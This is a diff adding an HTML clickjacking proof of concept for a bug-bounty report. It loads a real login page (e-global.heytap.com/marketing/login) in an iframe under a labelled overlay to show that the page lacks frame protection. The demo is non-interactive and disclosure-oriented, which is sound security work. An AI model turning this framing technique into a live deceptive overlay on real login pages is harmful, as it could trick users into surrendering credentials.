@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head><title>Clickjacking PoC — e-global.heytap.com/marketing/login</title>
+<style>
+  body { margin:0; font-family:sans-serif; background:#1a1a2e; }
+  .banner { background:#f85149; color:#fff; padding:10px 20px; font-weight:700; position:fixed; top:0; left:0; right:0; z-index:10; }
+  .frame-wrap { position:relative; margin-top:60px; }
+  iframe { width:100%; height:800px; border:1px solid #444; opacity:0.9; }
+  .overlay { position:absolute; top:220px; left:50%; transform:translateX(-50%); background:rgba(248,81,73,.95); color:#fff; padding:14px 28px; border-radius:8px; font-weight:700; pointer-events:none; }
+  .note { color:#8b949e; padding:8px 20px; font-size:13px; }
+</style>
+</head>
+<body>
+<div class="banner">PoC — target page loads in iframe with NO X-Frame-Options / CSP frame-ancestors. Overlay demonstrates UI-redress on credential fields.</div>
+<div class="frame-wrap">
+  <iframe src="https://e-global.heytap.com/marketing/login" id="target"></iframe>
+  <div class="overlay">← attacker-controlled overlay can cover the login form</div>
+</div>
+<p class="note">If the login form renders and accepts clicks inside this iframe, the page is clickjackable (OPPO policy Low #4: clickjacking on input pages containing sensitive information). Researcher: jamesthompson-sd, X-HackerOne-Research header used on all probes.</p>
+<script>
+  document.getElementById('target').addEventListener('load', () => {
+    document.title = 'PoC loaded — form interactive check: ' + new Date().toISOString();
+  });
+</script>
+</body>
+</html>
